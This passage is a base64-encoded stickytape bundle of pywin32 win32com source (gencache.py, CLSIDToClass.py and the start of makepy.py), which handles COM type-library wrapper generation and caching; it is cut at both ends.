ncmFiIGxhc3RcbiAgICAgICAgICAgICAgICBpdGVtcy5zb3J0KClcbiAgICAgICAgICAgICAgICBuZXdfbWlub3IgPSBpdGVtc1stMV1bM11cbiAgICAgICAgICAgICAgICByZXQgPSBHZXRNb2R1bGVGb3JUeXBlbGliKHR5cGVsaWJDTFNJRCwgbGNpZCwgbWFqb3IsIG5ld19taW5vcilcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgcmV0ID0gTm9uZVxuICAgICAgICAgICAgIyByZW1lbWJlciBhbmQgcmV0dXJuXG4gICAgICAgICAgICB2ZXJzaW9uUmVkaXJlY3RNYXBba2V5XSA9IHJldFxuICAgICAgICAgICAgcmV0dXJuIHJldFxuICAgICAgICAjIHByaW50ICJSZWJ1aWxkaW5nOiAiLCBtYWpvciwgbWlub3JcbiAgICAgICAgbW9kdWxlID0gTWFrZU1vZHVsZUZvclR5cGVsaWIoXG4gICAgICAgICAgICB0eXBlbGliQ0xTSUQsXG4gICAgICAgICAgICBsY2lkLFxuICAgICAgICAgICAgbWFqb3IsXG4gICAgICAgICAgICBtaW5vcixcbiAgICAgICAgICAgIHByb2dyZXNzSW5zdGFuY2UsXG4gICAgICAgICAgICBiRm9yRGVtYW5kPWJGb3JEZW1hbmQsXG4gICAgICAgICAgICBiQnVpbGRIaWRkZW49YkJ1aWxkSGlkZGVuLFxuICAgICAgICApXG4gICAgICAgICMgSWYgd2UgcmVwbGFjZWQgc29tZXRoaW5nLCByZWxvYWQgaXRcbiAgICAgICAgaWYgYlJlbG9hZE5lZWRlZDpcbiAgICAgICAgICAgIG1vZHVsZSA9IHJlbG9hZChtb2R1bGUpXG4gICAgICAgICAgICBBZGRNb2R1bGVUb0NhY2hlKHR5cGVsaWJDTFNJRCwgbGNpZCwgbWFqb3IsIG1pbm9yKVxuICAgIHJldHVybiBtb2R1bGVcblxuXG5kZWYgRW5zdXJlRGlzcGF0Y2goXG4gICAgcHJvZ19pZCwgYkZvckRlbWFuZD0xXG4pOiAgIyBOZXcgZm4sIHNvIHdlIGRlZmF1bHQgdGhlIG5ldyBkZW1hbmQgZmVhdHVyZSB0byBvbiFcbiAgICAiIiJHaXZlbiBhIENPTSBwcm9nX2lkLCByZXR1cm4gYW4gb2JqZWN0IHRoYXQgaXMgdXNpbmcgbWFrZXB5IHN1cHBvcnQsIGJ1aWxkaW5nIGlmIG5lY2Vzc2FyeSIiIlxuICAgIGRpc3AgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2gocHJvZ19pZClcbiAgICBpZiBub3QgZGlzcC5fX2RpY3RfXy5nZXQoIkNMU0lEIik6ICAjIEVlZWsgLSBubyBtYWtlcHkgc3VwcG9ydCAtIHRyeSBhbmQgYnVpbGQgaXQuXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIHRpID0gZGlzcC5fb2xlb2JqXy5HZXRUeXBlSW5mbygpXG4gICAgICAgICAgICBkaXNwX2Nsc2lkID0gdGkuR2V0VHlwZUF0dHIoKVswXVxuICAgICAgICAgICAgdGxiLCBpbmRleCA9IHRpLkdldENvbnRhaW5pbmdUeXBlTGliKClcbiAgICAgICAgICAgIHRsYSA9IHRsYi5HZXRMaWJBdHRyKClcbiAgICAgICAgICAgIG1vZCA9IEVuc3VyZU1vZHVsZSh0bGFbMF0sIHRsYVsxXSwgdGxhWzNdLCB0bGFbNF0sIGJGb3JEZW1hbmQ9YkZvckRlbWFuZClcbiAgICAgICAgICAgIEdldE1vZHVsZUZvckNMU0lEKGRpc3BfY2xzaWQpXG4gICAgICAgICAgICAjIEdldCB0aGUgY2xhc3MgZnJvbSB0aGUgbW9kdWxlLlxuICAgICAgICAgICAgZnJvbSAuIGltcG9ydCBDTFNJRFRvQ2xhc3NcblxuICAgICAgICAgICAgZGlzcF9jbGFzcyA9IENMU0lEVG9DbGFzcy5HZXRDbGFzcyhzdHIoZGlzcF9jbHNpZCkpXG4gICAgICAgICAgICBkaXNwID0gZGlzcF9jbGFzcyhkaXNwLl9vbGVvYmpfKVxuICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjpcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcbiAgICAgICAgICAgICAgICAiVGhpcyBDT00gb2JqZWN0IGNhbiBub3QgYXV0b21hdGUgdGhlIG1ha2VweSBwcm9jZXNzIC0gcGxlYXNlIHJ1biBtYWtlcHkgbWFudWFsbHkgZm9yIHRoaXMgb2JqZWN0IlxuICAgICAgICAgICAgKVxuICAgIHJldHVybiBkaXNwXG5cblxuZGVmIEFkZE1vZHVsZVRvQ2FjaGUoXG4gICAgdHlwZWxpYmNsc2lkLCBsY2lkLCBtYWpvciwgbWlub3IsIHZlcmJvc2U9MSwgYkZsdXNoTm93PW5vdCBpc19yZWFkb25seVxuKTpcbiAgICAiIiJBZGQgYSBuZXdseSBnZW5lcmF0ZWQgZmlsZSB0byB0aGUgY2FjaGUgZGljdGlvbmFyeS4iIiJcbiAgICBmbmFtZSA9IEdldEdlbmVyYXRlZEZpbGVOYW1lKHR5cGVsaWJjbHNpZCwgbGNpZCwgbWFqb3IsIG1pbm9yKVxuICAgIG1vZCA9IF9HZXRNb2R1bGUoZm5hbWUpXG4gICAgIyBpZiBtb2QuX2luX2dlbmNhY2hlXyBpcyBhbHJlYWR5IHRydWUsIHRoZW4gd2UgYXJlIHJlbG9hZGluZyB0aGlzXG4gICAgIyBtb2R1bGUgLSB0aGlzIGRvZXNuXCd0IG1lYW4gYW55dGhpbmcgc3BlY2lhbCB0aG91Z2ghXG4gICAgbW9kLl9pbl9nZW5jYWNoZV8gPSAxXG4gICAgaW5mbyA9IHN0cih0eXBlbGliY2xzaWQpLCBsY2lkLCBtYWpvciwgbWlub3JcbiAgICBkaWN0X21vZGlmaWVkID0gRmFsc2VcblxuICAgIGRlZiBTZXRUeXBlbGliRm9yQWxsQ2xzaWRzKGRpY3QpOlxuICAgICAgICBub25sb2NhbCBkaWN0X21vZGlmaWVkXG4gICAgICAgIGZvciBjbHNpZCwgY2xzIGluIGRpY3QuaXRlbXMoKTpcbiAgICAgICAgICAgIGlmIGNsc2lkVG9UeXBlbGliLmdldChjbHNpZCkgIT0gaW5mbzpcbiAgICAgICAgICAgICAgICBjbHNpZFRvVHlwZWxpYltjbHNpZF0gPSBpbmZvXG4gICAgICAgICAgICAgICAgZGljdF9tb2RpZmllZCA9IFRydWVcblxuICAgIFNldFR5cGVsaWJGb3JBbGxDbHNpZHMobW9kLkNMU0lEVG9DbGFzc01hcClcbiAgICBTZXRUeXBlbGliRm9yQWxsQ2xzaWRzKG1vZC5DTFNJRFRvUGFja2FnZU1hcClcbiAgICBTZXRUeXBlbGliRm9yQWxsQ2xzaWRzKG1vZC5WVGFibGVzVG9DbGFzc01hcClcbiAgICBTZXRUeXBlbGliRm9yQWxsQ2xzaWRzKG1vZC5WVGFibGVzVG9QYWNrYWdlTWFwKVxuXG4gICAgIyBJZiB0aGlzIGxpYiB3YXMgcHJldmlvdXNseSByZWRpcmVjdGVkLCBkcm9wIGl0XG4gICAgaWYgaW5mbyBpbiB2ZXJzaW9uUmVkaXJlY3RNYXA6XG4gICAgICAgIGRlbCB2ZXJzaW9uUmVkaXJlY3RNYXBbaW5mb11cbiAgICBpZiBiRmx1c2hOb3cgYW5kIGRpY3RfbW9kaWZpZWQ6XG4gICAgICAgIF9TYXZlRGljdHMoKVxuXG5cbmRlZiBHZXRHZW5lcmF0ZWRJbmZvcygpOlxuICAgIHppcF9wb3MgPSB3aW4zMmNvbS5fX2dlbl9wYXRoX18uZmluZCgiLnppcFxcXFwiKVxuICAgIGlmIHppcF9wb3MgPj0gMDpcbiAgICAgICAgaW1wb3J0IHppcGZpbGVcblxuICAgICAgICB6aXBfZmlsZSA9IHdpbjMyY29tLl9fZ2VuX3BhdGhfX1s6IHppcF9wb3MgKyA0XVxuICAgICAgICB6aXBfcGF0aCA9IHdpbjMyY29tLl9fZ2VuX3BhdGhfX1t6aXBfcG9zICsgNSA6XS5yZXBsYWNlKCJcXFxcIiwgIi8iKVxuICAgICAgICB6ZiA9IHppcGZpbGUuWmlwRmlsZSh6aXBfZmlsZSlcbiAgICAgICAgaW5mb3MgPSB7fVxuICAgICAgICBmb3IgbiBpbiB6Zi5uYW1lbGlzdCgpOlxuICAgICAgICAgICAgaWYgbm90IG4uc3RhcnRzd2l0aCh6aXBfcGF0aCk6XG4gICAgICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgICAgIGJhc2UgPSBuW2xlbih6aXBfcGF0aCkgKyAxIDpdLnNwbGl0KCIvIilbMF1cbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBpaWQsIGxjaWQsIG1ham9yLCBtaW5vciA9IGJhc2Uuc3BsaXQoIngiKVxuICAgICAgICAgICAgICAgIGxjaWQgPSBpbnQobGNpZClcbiAgICAgICAgICAgICAgICBtYWpvciA9IGludChtYWpvcilcbiAgICAgICAgICAgICAgICBtaW5vciA9IGludChtaW5vcilcbiAgICAgICAgICAgICAgICBpaWQgPSBweXdpbnR5cGVzLklJRCgieyIgKyBpaWQgKyAifSIpXG4gICAgICAgICAgICBleGNlcHQgVmFsdWVFcnJvcjpcbiAgICAgICAgICAgICAgICBjb250aW51ZVxuICAgICAgICAgICAgZXhjZXB0IHB5d2ludHlwZXMuY29tX2Vycm9yOlxuICAgICAgICAgICAgICAgICMgaW52YWxpZCBJSURcbiAgICAgICAgICAgICAgICBjb250aW51ZVxuICAgICAgICAgICAgaW5mb3NbKGlpZCwgbGNpZCwgbWFqb3IsIG1pbm9yKV0gPSAxXG4gICAgICAgIHpmLmNsb3NlKClcbiAgICAgICAgcmV0dXJuIGxpc3QoaW5mb3Mua2V5cygpKVxuICAgIGVsc2U6XG4gICAgICAgICMgb24gdGhlIGZpbGUgc3lzdGVtXG4gICAgICAgIGZpbGVzID0gZ2xvYi5nbG9iKHdpbjMyY29tLl9fZ2VuX3BhdGhfXyArICJcXFxcKiIpXG4gICAgICAgIHJldCA9IFtdXG4gICAgICAgIGZvciBmaWxlIGluIGZpbGVzOlxuICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIoZmlsZSkgYW5kIG5vdCBvcy5wYXRoLnNwbGl0ZXh0KGZpbGUpWzFdID09ICIucHkiOlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICBuYW1lID0gb3MucGF0aC5zcGxpdGV4dChvcy5wYXRoLnNwbGl0KGZpbGUpWzFdKVswXVxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIGlpZCwgbGNpZCwgbWFqb3IsIG1pbm9yID0gbmFtZS5zcGxpdCgieCIpXG4gICAgICAgICAgICAgICAgaWlkID0gcHl3aW50eXBlcy5JSUQoInsiICsgaWlkICsgIn0iKVxuICAgICAgICAgICAgICAgIGxjaWQgPSBpbnQobGNpZClcbiAgICAgICAgICAgICAgICBtYWpvciA9IGludChtYWpvcilcbiAgICAgICAgICAgICAgICBtaW5vciA9IGludChtaW5vcilcbiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICBleGNlcHQgcHl3aW50eXBlcy5jb21fZXJyb3I6XG4gICAgICAgICAgICAgICAgIyBpbnZhbGlkIElJRFxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICByZXQuYXBwZW5kKChpaWQsIGxjaWQsIG1ham9yLCBtaW5vcikpXG4gICAgICAgIHJldHVybiByZXRcblxuXG5kZWYgX0dldE1vZHVsZShmbmFtZSk6XG4gICAgIiIiR2l2ZW4gdGhlIG5hbWUgb2YgYSBtb2R1bGUgaW4gdGhlIGdlbl9weSBkaXJlY3RvcnksIGltcG9ydCBhbmQgcmV0dXJuIGl0LiIiIlxuICAgIG1vZF9uYW1lID0gIndpbjMyY29tLmdlbl9weS4lcyIgJSBmbmFtZVxuICAgIG1vZCA9IF9faW1wb3J0X18obW9kX25hbWUpXG4gICAgcmV0dXJuIHN5cy5tb2R1bGVzW21vZF9uYW1lXVxuXG5cbmRlZiBSZWJ1aWxkKHZlcmJvc2U9MSk6XG4gICAgIiIiUmVidWlsZCB0aGUgY2FjaGUgaW5kZXhlcyBmcm9tIHRoZSBmaWxlIHN5c3RlbS4iIiJcbiAgICBjbHNpZFRvVHlwZWxpYi5jbGVhcigpXG4gICAgaW5mb3MgPSBHZXRHZW5lcmF0ZWRJbmZvcygpXG4gICAgaWYgdmVyYm9zZSBhbmQgbGVuKGluZm9zKTogICMgRG9udCBib3RoZXIgcmVwb3J0aW5nIHRoaXMgd2hlbiBkaXJlY3RvcnkgaXMgZW1wdHkhXG4gICAgICAgIHByaW50KCJSZWJ1aWxkaW5nIGNhY2hlIG9mIGdlbmVyYXRlZCBmaWxlcyBmb3IgQ09NIHN1cHBvcnQuLi4iKVxuICAgIGZvciBpbmZvIGluIGluZm9zOlxuICAgICAgICBpaWQsIGxjaWQsIG1ham9yLCBtaW5vciA9IGluZm9cbiAgICAgICAgaWYgdmVyYm9zZTpcbiAgICAgICAgICAgIHByaW50KCJDaGVja2luZyIsIEdldEdlbmVyYXRlZEZpbGVOYW1lKCppbmZvKSlcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgQWRkTW9kdWxlVG9DYWNoZShpaWQsIGxjaWQsIG1ham9yLCBtaW5vciwgdmVyYm9zZSwgMClcbiAgICAgICAgZXhjZXB0OlxuICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgIkNvdWxkIG5vdCBhZGQgbW9kdWxlICVzIC0gJXM6ICVzIlxuICAgICAgICAgICAgICAgICUgKGluZm8sIHN5cy5leGNfaW5mbygpWzBdLCBzeXMuZXhjX2luZm8oKVsxXSlcbiAgICAgICAgICAgIClcbiAgICBpZiB2ZXJib3NlIGFuZCBsZW4oaW5mb3MpOiAgIyBEb250IGJvdGhlciByZXBvcnRpbmcgdGhpcyB3aGVuIGRpcmVjdG9yeSBpcyBlbXB0eSFcbiAgICAgICAgcHJpbnQoIkRvbmUuIilcbiAgICBfU2F2ZURpY3RzKClcblxuXG5kZWYgX0R1bXAoKTpcbiAgICBwcmludCgiQ2FjaGUgaXMgaW4gZGlyZWN0b3J5Iiwgd2luMzJjb20uX19nZW5fcGF0aF9fKVxuICAgICMgQnVpbGQgYSB1bmlxdWUgZGlyXG4gICAgZCA9IHt9XG4gICAgZm9yIGNsc2lkLCAodHlwZWxpYkNMU0lELCBsY2lkLCBtYWpvciwgbWlub3IpIGluIGNsc2lkVG9UeXBlbGliLml0ZW1zKCk6XG4gICAgICAgIGRbdHlwZWxpYkNMU0lELCBsY2lkLCBtYWpvciwgbWlub3JdID0gTm9uZVxuICAgIGZvciB0eXBlbGliQ0xTSUQsIGxjaWQsIG1ham9yLCBtaW5vciBpbiBkLmtleXMoKTpcbiAgICAgICAgbW9kID0gR2V0TW9kdWxlRm9yVHlwZWxpYih0eXBlbGliQ0xTSUQsIGxjaWQsIG1ham9yLCBtaW5vcilcbiAgICAgICAgcHJpbnQoIiVzIC0gJXMiICUgKG1vZC5fX2RvY19fLCB0eXBlbGliQ0xTSUQpKVxuXG5cbiMgQm9vdCB1cFxuX19pbml0X18oKVxuXG5cbmRlZiB1c2FnZSgpOlxuICAgIHVzYWdlU3RyaW5nID0gIiIiXFxcblx0ICBVc2FnZTogZ2VuY2FjaGUgWy1xXSBbLWRdIFstcl1cblxuXHRcdFx0IC1xICAgICAgICAgLSBRdWlldFxuXHRcdFx0IC1kICAgICAgICAgLSBEdW1wIHRoZSBjYWNoZSAodHlwZWxpYnJhcnkgZGVzY3JpcHRpb24gYW5kIGZpbGVuYW1lKS5cblx0XHRcdCAtciAgICAgICAgIC0gUmVidWlsZCB0aGUgY2FjaGUgZGljdGlvbmFyeSBmcm9tIHRoZSBleGlzdGluZyAucHkgZmlsZXNcblx0IiIiXG4gICAgcHJpbnQodXNhZ2VTdHJpbmcpXG4gICAgc3lzLmV4aXQoMSlcblxuXG5pZiBfX25hbWVfXyA9PSAiX19tYWluX18iOlxuICAgIGltcG9ydCBnZXRvcHRcblxuICAgIHRyeTpcbiAgICAgICAgb3B0cywgYXJncyA9IGdldG9wdC5nZXRvcHQoc3lzLmFyZ3ZbMTpdLCAicXJkIilcbiAgICBleGNlcHQgZ2V0b3B0LmVycm9yIGFzIG1lc3NhZ2U6XG4gICAgICAgIHByaW50KG1lc3NhZ2UpXG4gICAgICAgIHVzYWdlKClcblxuICAgICMgd2Ugb25seSBoYXZlIG9wdGlvbnMgLSBjb21wbGFpbiBhYm91dCByZWFsIGFyZ3MsIG9yIG5vbmUgYXQgYWxsIVxuICAgIGlmIGxlbihzeXMuYXJndikgPT0gMSBvciBhcmdzOlxuICAgICAgICBwcmludCh1c2FnZSgpKVxuXG4gICAgdmVyYm9zZSA9IDFcbiAgICBmb3Igb3B0LCB2YWwgaW4gb3B0czpcbiAgICAgICAgaWYgb3B0ID09ICItZCI6ICAjIER1bXBcbiAgICAgICAgICAgIF9EdW1wKClcbiAgICAgICAgaWYgb3B0ID09ICItciI6XG4gICAgICAgICAgICBSZWJ1aWxkKHZlcmJvc2UpXG4gICAgICAgIGlmIG9wdCA9PSAiLXEiOlxuICAgICAgICAgICAgdmVyYm9zZSA9IDBcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCd3aW4zMmNvbS9jbGllbnQvQ0xTSURUb0NsYXNzLnB5JywgYiciIiJNYW5hZ2VzIGEgZGljdGlvbmFyeSBvZiBDTFNJRCBzdHJpbmdzIHRvIFB5dGhvbiBjbGFzc2VzLlxuXG5QcmltYXJ5IHVzZSBvZiB0aGlzIG1vZHVsZSBpcyB0byBhbGxvdyBtb2R1bGVzIGdlbmVyYXRlZCBieVxubWFrZXB5LnB5IHRvIHNoYXJlIGNsYXNzZXMuICBAbWFrZXB5QCBhdXRvbWF0aWNhbGx5IGdlbmVyYXRlcyBjb2RlXG53aGljaCBpbnRlcmFjdHMgd2l0aCB0aGlzIG1vZHVsZS4gIFlvdSBzaG91bGQgbmV2ZXIgbmVlZCB0byByZWZlcmVuY2VcbnRoaXMgbW9kdWxlIGRpcmVjdGx5LlxuXG5UaGlzIG1vZHVsZSBvbmx5IHByb3ZpZGVzIHN1cHBvcnQgZm9yIG1vZHVsZXMgd2hpY2ggaGF2ZSBiZWVuIHByZXZpb3VzbHlcbmJlZW4gaW1wb3J0ZWQuICBUaGUgZ2VuY2FjaGUgbW9kdWxlIHByb3ZpZGVzIHNvbWUgc3VwcG9ydCBmb3IgbG9hZGluZyBtb2R1bGVzXG5vbiBkZW1hbmQgLSBvbmNlIGRvbmUsIHRoaXMgbW9kdWxlIHN1cHBvcnRzIGl0Li4uXG5cbkFzIGFuIGV4YW1wbGUsIHRoZSBNU0FDQ0VTUy5UTEIgdHlwZSBsaWJyYXJ5IG1ha2VzIHJlZmVyZW5jZSB0byB0aGVcbkNMU0lEIG9mIHRoZSBEYXRhYmFzZSBvYmplY3QsIGFzIGRlZmluZWQgaW4gREFPMzAzMi5ETEwuICBUaGlzXG5hbGxvd3MgY29kZSB1c2luZyB0aGUgTVNBY2Nlc3Mgd3JhcHBlciB0byBuYXRpdmVseSB1c2UgRGF0YWJhc2VzLlxuXG5UaGlzIG9idmlvdXNseSBhcHBsaWVzIHRvIGFsbCBjb29wZXJhdGluZyBvYmplY3RzLCBub3QganVzdCBEQU8gYW5kXG5BY2Nlc3MuXG4iIiJcbm1hcENMU0lEVG9DbGFzcyA9IHt9XG5cblxuZGVmIFJlZ2lzdGVyQ0xTSUQoY2xzaWQsIHB5dGhvbkNsYXNzKTpcbiAgICAiIiJSZWdpc3RlciBhIGNsYXNzIHRoYXQgd3JhcHMgYSBDTFNJRFxuXG4gICAgVGhpcyBmdW5jdGlvbiBhbGxvd3MgYSBDTFNJRCB0byBiZSBnbG9iYWxseSBhc3NvY2lhdGVkIHdpdGggYSBjbGFzcy5cbiAgICBDZXJ0YWluIG1vZHVsZSB3aWxsIGF1dG9tYXRpY2FsbHkgY29udmVydCBhbiBJRGlzcGF0Y2ggb2JqZWN0IHRvIGFuXG4gICAgaW5zdGFuY2Ugb2YgdGhlIGFzc29jaWF0ZWQgY2xhc3MuXG4gICAgIiIiXG5cbiAgICBtYXBDTFNJRFRvQ2xhc3Nbc3RyKGNsc2lkKV0gPSBweXRob25DbGFzc1xuXG5cbmRlZiBSZWdpc3RlckNMU0lEc0Zyb21EaWN0KGRpY3QpOlxuICAgICIiIlJlZ2lzdGVyIGEgZGljdGlvbmFyeSBvZiBDTFNJRFwncyBhbmQgY2xhc3Nlcy5cblxuICAgIFRoaXMgbW9kdWxlIHBlcmZvcm1zIHRoZSBzYW1lIGZ1bmN0aW9uIGFzIEBSZWdpc3RlckNMU0lEQCwgYnV0IGZvclxuICAgIGFuIGVudGlyZSBkaWN0aW9uYXJ5IG9mIGFzc29jaWF0aW9ucy5cblxuICAgIFR5cGljYWxseSBjYWxsZWQgYnkgbWFrZXB5IGdlbmVyYXRlZCBtb2R1bGVzIGF0IGltcG9ydCB0aW1lLlxuICAgICIiIlxuICAgIG1hcENMU0lEVG9DbGFzcy51cGRhdGUoZGljdClcblxuXG5kZWYgR2V0Q2xhc3MoY2xzaWQpOlxuICAgICIiIkdpdmVuIGEgQ0xTSUQsIHJldHVybiB0aGUgZ2xvYmFsbHkgYXNzb2NpYXRlZCBjbGFzcy5cblxuICAgIGNsc2lkIC0tIGEgc3RyaW5nIENMU0lEIHJlcHJlc2VudGF0aW9uIHRvIGNoZWNrLlxuICAgICIiIlxuICAgIHJldHVybiBtYXBDTFNJRFRvQ2xhc3NbY2xzaWRdXG5cblxuZGVmIEhhc0NsYXNzKGNsc2lkKTpcbiAgICAiIiJEZXRlcm1pbmVzIGlmIHRoZSBDTFNJRCBoYXMgYW4gYXNzb2NpYXRlZCBjbGFzcy5cblxuICAgIGNsc2lkIC0tIHRoZSBzdHJpbmcgQ0xTSUQgdG8gY2hlY2tcbiAgICAiIiJcbiAgICByZXR1cm4gY2xzaWQgaW4gbWFwQ0xTSURUb0NsYXNzXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnd2luMzJjb20vY2xpZW50L21ha2VweS5weScsIGInIyBPcmlnaW5hbGx5IHdyaXR0ZW4gYnkgQ3VydCBIYWdlbmxvY2hlciwgYW5kIHZhcmlvdXMgYml0c1xuIyBhbmQgcGllY2VzIGJ5IE1hcmsgSGFtbW9uZCAoYW5kIG5vdyBHcmVnIFN0ZWluIGhhcyBoYWRcbiMgYSBnbyB0b28gOi0pXG5cbiMgTm90ZSB0aGF0IHRoZSBtYWluIHdvcmtlciBjb2RlIGhhcyBiZWVuIG1vdmVkIHRvIGdlbnB5LnB5XG4jIEFzIHRoaXMgaXMgbm9ybWFsbHkgcnVuIGZyb20gdGhlIGNvbW1hbmQgbGluZSwgaXQgcmVwYXJzZXMgdGhlIGNvZGUgZWFjaCB0aW1lLlxuIyBOb3cgdGhpcyBpcyBub3RoaW5nIG1vcmUgdGhhbiB0aGUgY29tbWFuZCBsaW5lIGhhbmRsZXIgYW5kIHB1YmxpYyBpbnRlcmZhY2UuXG5cbiMgWFhYIC0gVE8gRE9cbiMgWFhYIC0gR3JlZyBhbmQgTWFyayBoYXZlIHNvbWUgaWRlYXMgZm9yIGEgcmV2YW1wIC0ganVzdCBub1xuIyAgICAgICB0aW1lIC0gaWYgeW91IHdhbnQgdG8gaGVscCwgY29udGFjdCB1cyBmb3IgZGV0YWlscy5cbiMgICAgICAgTWFpbiBpZGVhIGlzIHRvIGRyb3AgdGhlIGNsYXNzZXMgZXhwb3J0ZWQgYW5kIG1vdmUgdG8gYSBtb3JlXG4jICAgICAgIHRyYWRpdGlvbmFsIGRhdGEgZHJpdmVuIG1vZGVsLlxuXG4iIiJHZW5lcmF0ZSBhIC5weSBmaWxlIGZyb20gYW4gT0xFIFR5cGVMaWJyYXJ5IGZpbGUuXG5cblxuIFRoaXMgbW9kdWxlIGlzIGNvbmNlcm5lZCBvbmx5IHdpdGggdGhlIGFjdHVhbCB3cml0aW5nIG9mXG4gYSAucHkgZmlsZS4gIEl0IGRyYXdzIG9uIHRoZSBAYnVpbGRAIG1vZHVsZSwgd2hpY2ggYnVpbGRzXG4gdGhlIGtub3dsZWRnZSBvZiBhIENPTSBpbnRlcmZhY2UuXG5cbiIiIlxudXNhZ2VIZWxwID0gIiIiIFxcXG5cblVzYWdlOlxuXG4gIG1ha2VweS5weSBbLWldIFstdnxxXSBbLWhdIFstdV0gWy1vIG91dHB1dF9maWxlXSBbLWRdIFt0eXBlbGliLCAuLi5dXG5cbiAgLWkgICAgLS0gU2hvdyBpbmZvcm1hdGlvbiBmb3IgdGhlIHNwZWNpZmllZCB0eXBlbGliLlxuXG4gIC12ICAgIC0tIFZlcmJvc2Ugb3V0cHV0LlxuXG4gIC1xICAgIC0tIFF1aWV0IG91dHB1dC5cblxuICAtaCAgICAtLSBEbyBub3QgZ2VuZXJhdGUgaGlkZGVuIG1ldGhvZHMuXG5cbiAgLXUgICAgLS0gUHl0aG9uIDEuNSBhbmQgZWFybGllcjogRG8gTk9UIGNvbnZlcnQgYWxsIFVuaWNvZGUgb2JqZWN0cyB0b1xuICAgICAgICAgICBzdHJpbmdzLlxuXG4gICAgICAgICAgIFB5dGhvbiAxLjYgYW5kIGxhdGVyOiBDb252ZXJ0IGFsbCBVbmljb2RlIG9iamVjdHMgdG8gc3RyaW5ncy5cblxuICAtbyAgICAtLSBDcmVhdGUgb3V0cHV0IGluIGEgc3BlY2lmaWVkIG91dHB1dCBmaWxlLiAgSWYgdGhlIHBhdGggbGVhZGluZ1xuICAgICAgICAgICB0byB0aGUgZmlsZSBkb2VzIG5vdCBleGlzdCwgYW55IG1pc3NpbmcgZGlyZWN0b3JpZXMgd2lsbCBiZVxuICAgICAgICAgICBjcmVhdGVkLlxuICAgICAgICAgICBOT1RFOiAtbyBjYW5ub3QgYmUgdXNlZCB3aXRoIC1kLiAgVGhpcyB3aWxsIGdlbmVyYXRlIGFuIGVycm9yLlxuXG4gIC1kICAgIC0tIEdlbmVyYXRlIHRoZSBiYXNlIGNvZGUgbm93IGFuZCB0aGUgY2xhc3MgY29kZSBvbiBkZW1hbmQuXG4gICAgICAgICAgIFJlY29tbWVuZGVkIGZvciBsYXJnZSB0eXBlIGxpYnJhcmllcy5cblxuICB0eXBlbGliIC0tIEEgVExCLCBETEwsIE9DWCBvciBhbnl0aGluZyBjb250YWluaW5nIENPTSB0eXBlIGluZm9ybWF0aW9uLlxuICAgICAgICAgICAgIElmIGEgdHlwZWxpYiBpcyBub3Qgc3BlY2lmaWVkLCBhIHdpbmRvdyBjb250YWluaW5nIGEgdGV4dGJveFxuICAgICAgICAgICAgIHdpbGwgb3BlbiBmcm9tIHdoaWNoIHlvdSBjYW4gc2VsZWN0IGEgcmVnaXN0ZXJlZCB0eXBlXG4gICAgICAgICAgICAgbGlicmFyeS5cblxuRXhhbXBsZXM6XG5cbiAgbWFrZXB5LnB5IC1kXG5cbiAgICBQcmVzZW50cyBhIGxpc3Qgb2YgcmVnaXN0ZXJlZCB0eXBlIGxpYnJhcmllcyBmcm9tIHdoaWNoIHlvdSBjYW4gbWFrZVxuICAgIGEgc2VsZWN0aW9uLlxuXG4gIG1ha2VweS5weSAtZCAiTWljcm9zb2Z0IEV4Y2VsIDguMCBPYmplY3QgTGlicmFyeSJcblxuICAgIEdlbmVyYXRlIHN1cHBvcnQgZm9yIHRoZSB0eXBlIGxpYnJhcnkgd2l0aCB0aGUgc3BlY2lmaWVkIGRlc2NyaXB0aW9uXG4gICAgKGluIHRoaXMgY2FzZSwgdGhlIE1TIEV4Y2VsIG9iamVjdCBtb2RlbCkuXG5cbiIiIlxuXG5pbXBvcnQgc3lzLCBvcywgaW1wb3J0bGliLCBweXRob25jb21cbmZyb20gd2luMzJjb20uY2xpZW50IGltcG9ydCBnZW5weSwgc2VsZWN0dGxiLCBnZW5jYWNoZVxuZnJvbSB3aW4zMmNvbS5jbGllbnQgaW1wb3J0IERpc3BhdGNoXG5cbmJGb3JEZW1hbmREZWZhdWx0ID0gMCAgIyBEZWZhdWx0IHZhbHVlIG9mIGJGb3JEZW1hbmQgLSB0b2dnbGUgdGhpcyB0byBjaGFuZ2UgdGhlIHdvcmxkIC0gc2VlIGFsc28gZ2VuY2FjaGUucHlcblxuZXJyb3IgPSAibWFrZXB5LmVycm9yIlxuXG5cbmRlZiB1c2FnZSgpOlxuICAgIHN5cy5zdGRlcnIud3JpdGUodXNhZ2VIZWxwKVxuICAgIHN5cy5leGl0KDIpXG5cblxuZGVmIFNob3dJbmZvKHNwZWMpOlxuICAgIGlmIG5vdCBzcGVjOlxuICAgICAgICB0bGJTcGVjID0gc2VsZWN0dGxiLlNlbGVjdFRsYihleGNsdWRlRmxhZ3M9c2VsZWN0dGxiLkZMQUdfSElEREVOKVxuICAgICAgICBpZiB0bGJTcGVjIGlzIE5vbmU6XG4gICAgICAgICAgICByZXR1cm5cbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgdGxiID0gcHl0aG9uY29tLkxvYWRSZWdUeXBlTGliKFxuICAgICAgICAgICAgICAgIHRsYlNwZWMuY2xzaWQsIHRsYlNwZWMubWFqb3IsIHRsYlNwZWMubWlub3IsIHRsYlNwZWMubGNpZFxuICAgICAgICAgICAgKVxuICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjogICMgTWF5IGJlIGJhZGx5IHJlZ2lzdGVyZWQuXG4gICAgICAgICAgICBzeXMuc3RkZXJyLn